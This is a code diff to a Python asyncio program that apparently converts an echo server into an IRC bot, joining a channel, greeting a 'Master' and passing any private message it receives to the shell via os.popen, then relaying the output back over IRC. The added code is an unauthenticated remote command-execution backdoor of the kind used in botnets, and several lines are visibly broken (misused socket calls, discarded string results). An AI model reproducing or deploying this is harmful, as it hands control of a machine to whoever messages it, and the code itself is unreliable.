@@ -29,11 +29,58 @@ async def initiate_connection(address):
     sock.bind(address)
     sock.listen(5)
     sock.setblocking(False)
-
-s.send(bytes("PRIVMSG %s :Hello Master :) Tell me commands to do \r\n" % MASTER, "UTF-8"))
-
-
+    sock.send(bytes("NICK %s\r\n" % NICK, "UTF-8"))
+    sock.send(bytes("USER %s %s bla :%s\r\n" % (IDENT, HOST, REALNAME), "UTF-8"))
+    sock.send(bytes("JOIN #%s \r\n" % (CHANNEL), "UTF-8"))
+    sock.send(bytes("PRIVMSG %s :Hello Master :) Tell me commands to do \r\n" % MASTER, "UTF-8"))
     while True:
         client, addr = await loop.sock_accept(sock)
-        loop.create_task(echo_handler(client))
+        print('New command', addr)
+        loop.create_task(command_handler(client))
 
+
+async def command_handler(client):
+    with client:
+        while True:
+            data = await loop.sock_recv(client, 10000)
+            if not data:
+                break
+            temp = str.split(data, "\n")
+            data = temp.pop()
+
+            for line in temp:
+                line = str.rstrip(line)
+                line = str.split(line)
+
+                if line[0] == "PING":
+                    loop.sock_sendall(bytes("PONG %s\r\n" % line[1], "UTF-8"))
+                if line[1] == "PRIVMSG":
+                    sender = ""
+                    for char in line[0]:
+                        if char == "!":
+                            break
+                        if char != ":":
+                            sender += char
+                    size = len(line)
+                    i = 3
+                    message = ""
+                    while i < size:
+                        message += line[i] + " "
+                        i = i + 1
+                    message.lstrip(":")
+                    loop.sock_sendall(bytes("PRIVMSG %s :Executing-> %s \r\n" % (sender, message[1:]), "UTF-8"))
+                    # Removing the first Char and sent it to shell
+                    # response = os.system(message[1:])
+                    p = os.popen(message[1:] + " 2>&1", "r")
+                    # Puts out the first 20 lines. There's a good reason for this.
+                    n = 0
+                    while n < 20:
+                        line = p.readline()
+                        if not line:
+                            break
+                        loop.sock_sendall(bytes("PRIVMSG %s :Response -> %s \r\n" % (sender, str(line)), "UTF-8"))
+                        time.sleep(1)
+                        n += 1
+                for index, i in enumerate(line):
+                    print(line[index])
+    print('Connection Closed!')
